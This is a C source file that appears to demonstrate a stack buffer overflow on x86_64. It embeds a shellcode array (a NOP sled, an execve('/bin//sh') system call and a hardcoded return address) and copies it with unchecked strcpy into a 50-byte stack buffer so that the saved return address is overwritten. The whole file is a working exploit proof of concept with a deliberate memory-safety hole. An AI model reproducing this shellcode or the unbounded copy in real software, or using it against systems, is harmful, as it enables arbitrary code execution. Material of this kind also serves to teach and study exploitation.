#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAX_SIZE 50     /*  buffer size in stack */

/*
 *  (low)          <-----------     (high)        %rsp
 *  ------------------------------------------------------
 *  .....  |   varX   |   %rbp  |   %rip   |  varX | .....
 *  ------------------------------------------------------
 */

/* X86_64 shell code */
static char shell_code[] = {
	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
  	0x48,0x83,0xec,0x08,                     // sub    $0x8,%rsp      --->   local var (8 bytes)
  	0x48,0xc7,0xc0,0x2f,0x62,0x69,0x6e,      // mov    $0x6e69622f,%rax 
  	0x48,0x89,0x04,0x24,                     // mov    %rax,(%rsp)    --->   /bin
  	0x48,0xc7,0xc0,0x2f,0x2f,0x73,0x68,      // mov    $0x68732f2f,%rax
  	0x48,0x89,0x44,0x24,0x04,                // mov    %rax,0x4(%rsp) --->   //sh
  	0x31,0xd2,                               // xor    %edx,%edx      --->   arg3
  	0x48,0x31,0xf6,                          // xor    %rsi,%rsi      --->   arg2
  	0x48,0x89,0xe7,                          // mov    %rsp,%rdi      --->   arg1
  	0x31,0xc0,                               // xor    %eax,%eax      --->   clear
  	0xb0,0x3b,                               // mov    $0x3b,%al      --->   syscall number (execve function)
  	0xf3,0x0f,0x1e,0xfa,                     // endbr64
  	0x0f,0x05,                               // syscall
	0x90,0x90,0x90,                          // nop
	0xa0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode address
};

static int string_copy(char * src)
{
	volatile int size;
	char dest[MAX_SIZE];

	size = sizeof(shell_code);
	if (strcpy (dest, src) == NULL)
		printf ("strcpy failed\n");
	else 
		printf ("strcpy success\n");

	printf ("copied size %d:%s\n", sizeof(shell_code), dest);

	(void) dest;
	return size;
}

int main(int argc, char *argv[])
{
	return string_copy(shell_code);
}
